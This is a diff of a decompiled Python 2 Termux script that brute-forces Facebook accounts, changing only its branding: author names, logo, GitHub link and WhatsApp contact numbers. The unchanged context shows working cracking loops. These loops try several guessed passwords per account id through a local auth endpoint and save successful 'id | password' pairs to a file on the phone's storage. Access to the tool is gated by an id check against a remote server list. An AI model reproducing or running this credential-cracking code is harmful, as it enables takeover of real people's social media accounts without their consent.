@@ -5,12 +5,12 @@
 # Python bytecode 2.7
 # Decompiled from: Python 2.7.17 (default, Dec  5 2019, 10:45:36) 
 # [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
-# Embedded file name: <MR_DARK>
+# Embedded file name: <MR_Hacker>
 import os, sys, time, datetime, re, threading, json, random, requests, hashlib, cookielib, uuid
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
-__author__ = 'Mr.james'
-__copyright = 'All rights reserved . Copyright  Mr.James'
+__author__ = 'Mr.shadow'
+__copyright = 'All rights reserved . Copyright  Mr.shadow'
 os.system('termux-setup-storage')
 try:
     os.mkdir('/sdcard/ids')
@@ -29,7 +29,7 @@ header = {'x-fb-connection-bandwidth': repr(bd),
    'x-fb-http-engine': 'Liger'}
 os.system('git pull')
 os.system('clear')
-logo = '\n\x1b[1;92m    ASAD ANSAARI OFFICIAL       .SSS\n\x1b[1;92m   ASAD ANSAARI OFFICIAL \n\x1b[1;91m   ASAD ANSAARI OFFICIAL \n\x1b[1;91m   ASAD ANSAARI OFFICIAL \n\x1b[1;97m   ASAD ANSAARI OFFICIAL \xe2\x80\xa2LOAFER\n\x1b[1;97m   ASAD ANSAARI OFFICIAL\n\x1b[1;94m   ASAD ANSAARI OFFICIAL \n\x1b[1;94m   ASAD ANSAARI OFFICIAL \n\x1b[1;93m   ASAD ANSAARI OFFICIAL\n\x1b[1;96mASAD ANSAARI OFFICIAL \n\x1b[1;96m   ASAD ANSAARI OFFICIAL\n\x1b[1;96m        \n\x1b[1;91m-----------------------------------------------\n\x1b[1;97m\xe2\x9e\xa3 Author : ASAD ANSAARI OFFICIAL\n\x1b[1;97m\xe2\x9e\xa3 Github : https://github.com/VirusMakerKingAsad\n\x1b[1;97m\xe2\x9e\xa3 WP NO: +923094347216\n\x1b[1;91m-----------------------------------------------'
+logo = '\n\x1b[1;92m    SHADOW HACKER CYBER KING       .SSS\n\x1b[1;92m  CYBER HACKER \n\x1b[1;91m   ALONE CODER \n\x1b[1;91m   Alone FIGHTER \n\x1b[1;97m   RAVI KUMAR \xe2\x80\xa2HATERS KA BAP\n\x1b[1;97m   RAVI/SHADOW\n\x1b[1;94m   REAL NAME \n\x1b[1;94m   ABID HUSSAIN \n\x1b[1;93m   KASHMIRI HACKER\n\x1b[1;96m NAME TU SUNA HOGA \n\x1b[1;96m   SHADOW HACKER\n\x1b[1;96m        \n\x1b[1;91m-----------------------------------------------\n\x1b[1;97m\xe2\x9e\xa3 Author : SHADOW HACKER\n\x1b[1;97m\xe2\x9e\xa3 Github : https://github.com/shadowhacker420\n\x1b[1;97m\xe2\x9e\xa3 WP NO: +923425081910\n\x1b[1;91m-----------------------------------------------'
 
 def reg():
     os.system('clear')
@@ -43,7 +43,7 @@ def reg():
     except (KeyError, IOError):
         reg2()
 
-    r = requests.get('https://raw.githubusercontent.com/VirusMakerKingAsad/main/server.txt').text
+    r = requests.get('https://raw.githubusercontent.com/shadowhacker420/main/server.txt').text
     if to in r:
         os.system('cd ..... && npm install')
         os.system('fuser -k 5000/tcp &')
@@ -59,7 +59,7 @@ def reg():
         print ' \x1b[1;92mCopy the id and send to admin'
         print ' \x1b[1;92mYour id: ' + to
         raw_input('\x1b[1;93m Press enter to send id')
-        os.system('xdg-open https://wa.me/+923094347216')
+        os.system('xdg-open https://wa.me/9203425081910')
         reg()
 
 
@@ -72,7 +72,7 @@ def reg2():
     print ' Your id: ' + id
     print ''
     raw_input(' Press enter to go to whatsapp ')
-    os.system('xdg-open https://wa.me/+923094347216')
+    os.system('xdg-open https://wa.me/+923425081910')
     sav = open('/sdcard/.hst.txt', 'w')
     sav.write(id)
     sav.close()
@@ -268,7 +268,7 @@ def menu():
     print '\x1b[1;92m[3] File Extract'
     print '\x1b[1;92m[4] View token'
     print '\x1b[1;92m[5] Logout'
-    print '\x1b[1;92m[6] Youtube ASAD ANSAARI OFFICIAL'
+    print '\x1b[1;92m[6] Youtube MR HACKER'
     menu_s()
 
 
@@ -279,7 +279,7 @@ def menu_s():
     elif ms == '2':
         choice_crack()
     elif ms == '3':
-        os.system('python2 loafer.py')
+        os.system('python2 Hack.py')
     elif ms == '4':
         v_tok()
     elif ms == '5':
@@ -442,7 +442,7 @@ def a_s():
     print ' \x1b[1;97mCrack Running\x1b[1;91m '
     time.sleep(0.5)
     print 47 * '-'
-    print '\t\x1b[1;94mHAMZA MUNIR OFFICIAL Kings Of Facebook\x1b[1;91m'
+    print '\t\x1b[1;94mSHADOW HACKER Kings Of Facebook\x1b[1;91m'
     print 47 * '-'
 
     def main(arg):
@@ -453,7 +453,7 @@ def a_s():
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\x1b[1;92m[HAMZA-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print '\x1b[1;92m[SHADOW-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                 ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
@@ -469,7 +469,7 @@ def a_s():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\x1b[1;92m[HAMZA-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print '\x1b[1;92m[SHADOW-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                     ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
@@ -485,7 +485,7 @@ def a_s():
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                     q = json.loads(data)
                     if 'loc' in q:
-                        print '\x1b[1;92m[HAMZA-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        print '\x1b[1;92m[SHADOW-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                         ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
@@ -501,7 +501,7 @@ def a_s():
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                         q = json.loads(data)
                         if 'loc' in q:
-                            print '\x1b[1;92m[HAMZA-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            print '\x1b[1;92m[SHADOW-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                             ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
@@ -672,7 +672,7 @@ def c_s():
     print ' \x1b[1;97m~~~ Crack Running ~~~\x1b[1;91m'
     time.sleep(0.5)
     print 47 * '-'
-    print '\t\x1b[1;94mHAMZA MUNIR OFFICIAL Kings Of Fcebook\x1b[1;91m'
+    print '\t\x1b[1;94mCYBER Kings Of Fcebook\x1b[1;91m'
     print 47 * '-'
 
     def main(arg):
@@ -682,7 +682,7 @@ def c_s():
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\x1b[1;92m[HAMZA-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print '\x1b[1;92m[SHADOW-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                 ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
@@ -697,7 +697,7 @@ def c_s():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\x1b[1;92m[HAMZA-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print '\x1b[1;92m[SHADOW-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                     ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
@@ -712,7 +712,7 @@ def c_s():
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                     q = json.loads(data)
                     if 'loc' in q:
-                        print '\x1b[1;92m[HAMZA-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        print '\x1b[1;92m[SHADOW-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                         ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
@@ -727,7 +727,7 @@ def c_s():
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                         q = json.loads(data)
                         if 'loc' in q:
-                            print '\x1b[1;92m[HAMZA-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            print '\x1b[1;92m[SHADOW-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                             ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
